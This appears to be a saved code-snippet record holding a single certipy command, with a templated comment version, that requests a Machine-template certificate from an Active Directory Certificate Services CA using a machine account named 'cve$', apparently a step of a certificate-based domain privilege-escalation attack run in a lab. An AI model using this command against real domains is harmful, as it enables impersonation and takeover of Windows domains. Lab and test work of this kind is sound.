---
id: f2d9e43e-3e8b-4e70-8801-03f1b9912cb9
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.137557+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
---

# Code Snippet f2d9e43e

**Language**: ps1

```ps1
# certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
```


